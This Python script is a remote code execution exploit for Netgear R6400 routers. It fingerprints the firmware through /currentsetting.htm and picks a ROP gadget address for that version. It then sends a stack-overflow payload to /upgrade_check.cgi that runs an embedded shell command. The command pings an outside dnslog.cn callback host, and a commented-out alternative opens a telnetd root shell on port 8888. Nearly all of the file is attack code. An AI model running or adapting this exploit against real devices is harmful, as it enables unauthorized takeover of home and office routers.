# -*- encoding:utf-8 -*-
import argparse
import socket
import struct
import sys
# from urlparse import urlparse
from urllib.parse import urlparse

address_info = {"R6400": {
    # 0) gadget: calls system($sp)
    "1.0.1.52": 0x31994,
    "1.0.1.50": 0x31974,
    "1.0.1.46": 0x31884,
    "1.0.1.44": 0x31244,
    "1.0.1.42": 0x31204,
    "1.0.1.36": 0x30D3C,
    "1.0.1.34": 0x30ba8,
    "1.0.1.26": 0x30a5c,
    "1.0.1.24": 0x30a10,
    "1.0.1.22": 0x30904,
    "1.0.1.20": 0x30648,
    "1.0.1.18": 0x302fc,
    "1.0.1.12": 0x2fdf4,
    "1.0.1.6": 0x2f6b4,
    "1.0.0.26": 0x2f6b4,
    "1.0.0.24": 0x2e96c,
    "1.0.0.20": 0x2e840,
    "1.0.0.14": 0x2e924,
}}

firmware_version_to_human_version = {"R6400": {
    "V1.0.1.52_1.0.36": "1.0.1.52",
    "V1.0.1.50_1.0.35": "1.0.1.50",
    "V1.0.1.46_1.0.32": "1.0.1.46",
    "V1.0.1.44_1.0.31": "1.0.1.44",
    "V1.0.1.42_1.0.28": "1.0.1.42",
    "V1.0.1.36_1.0.25": "1.0.1.36",
    "V1.0.1.34_1.0.24": "1.0.1.34",
    "V1.0.1.26_1.0.19": "1.0.1.26",
    "V1.0.1.24_1.0.18": "1.0.1.24",
    "V1.0.1.22_1.0.17": "1.0.1.22",
    "V1.0.1.20_1.0.16": "1.0.1.20",
    "V1.0.1.18_1.0.15": "1.0.1.18",
    "V1.0.1.12_1.0.11": "1.0.1.12",
    "V1.0.1.6_1.0.4": "1.0.1.6",
    "V1.0.0.26_1.0.14": "1.0.0.26",
    "V1.0.0.24_1.0.13": "1.0.0.24",
    "V1.0.0.20_1.0.11": "1.0.0.20",
    "V1.0.0.14_1.0.8": "1.0.0.14",
}}


def send_plain(ip, port, payload, keep_open):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(payload)
    if keep_open:
        return sock
    sock.close()


def send_ssl(ip, port, payload, keep_open):
    import ssl
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrappedSocket = ssl.wrap_socket(sock)
    wrappedSocket.connect((ip, port))
    wrappedSocket.send(payload)
    if keep_open:
        return wrappedSocket
    wrappedSocket.close()


def send(ip, port, is_https, payload, keep_open=False):
    if is_https:
        return send_ssl(ip, port, payload, keep_open)
    else:
        return send_plain(ip, port, payload, keep_open)


def find_item(contents, start_string):
    start = contents.find(start_string)
    if (start == -1):
        print("Failed to automatically detect version.")
        sys.exit(1)

    start += len(start_string)
    end = contents.find("\r\n", start)
    return contents[start:end].upper()  # upper just in case


def p32(address, model):
    return struct.pack("<I", address)


def detect_model_version(ip, port, is_https):
    request = "GET /currentsetting.htm HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip + ':' + str(port))
    sock = send(ip, port, is_https, request, True)

    contents = ""
    while contents.find("InternetConnectionStatus") == -1 and contents.find("401 Unauthorized") == -1:
        contents += str(sock.recv(1))

    # Some older models/versions don't have the currentsetting.htm page, or it's protected by login
    if contents.find("401 Unauthorized") != -1:
        print("Version detection against this router is not possible using currentsetting.htm.")
        print("Received response:\n{}\n".format(contents))
        sys.exit(1)

    model = find_item(contents, "Model=")
    firmware_version = find_item(contents, "Firmware=")
    if model != "R6400":
        print("Unknown model: {}".format(model))
        sys.exit(1)

    if firmware_version not in firmware_version_to_human_version[model]:
        print("Unknown model and version: {} {}".format(model, firmware_version))
        sys.exit(1)

    return model, firmware_version_to_human_version[model][firmware_version]


def main(url, cmd):
    ip = urlparse(url).hostname
    port = urlparse(url).port
    scheme = urlparse(url).scheme
    is_https = False
    if scheme == "https":
        is_https = True
    model, version = detect_model_version(ip, port, is_https)

    if version not in address_info[model]:
        print("This exploit does not have a ROP gadget for the selected version ({}).".format(version))
        sys.exit(1)

    # Generate the payload
    rop_gadget = address_info[model][version]
    if type(rop_gadget) == list:
        rop_gadget = [p32(x, model) for x in rop_gadget]
    else:
        rop_gadget = p32(rop_gadget, model)

    data = ""
    data += "*#$^\x00"  # marker
    data += "\x00\x04\x00"  # size
    data += "A" * 0x60
    data += "B" * 0x4  # r4
    data += "C" * 0x4  # r5
    data += "D" * 0x4  # r6
    data += "E" * 0x4  # r7
    data += "F" * 0x4  # r8
    data += "G" * 0x4  # r9
    data += "H" * 0x4  # r10
    data += "I" * 0x4  # r11
    data += rop_gadget  # pc
    data += cmd + "\x00"  # Add the command and then NULL-terminate it
    data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

    # Some of the different models/versions use different names for the argument
    argument_name = "mtenFWUpload"

    payload = ''
    payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
    payload += 'Host: {}\r\n'.format(ip + ':' + str(port))
    payload += 'Content-Disposition: AAAA\r\n'
    payload += 'Content-Length: {}\r\n'.format(len(data))
    payload += 'Content-Type: application/octet-stream\r\n'
    payload += 'name="{}"\r\n'.format(argument_name)
    payload += '\r\n'
    payload += data

    send(ip, port, is_https, payload)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target Host')
    parser.add_argument('-i', '--id', help='id')
    parser.add_argument('-s', '--server', default='127.0.0.1', help='dlserver')
    args = parser.parse_args()
    command = "ping -c 5 j051p8.dnslog.cn"
    # command = "telnetd -p 8888 /l /bin/sh"
    main(args.target, command)
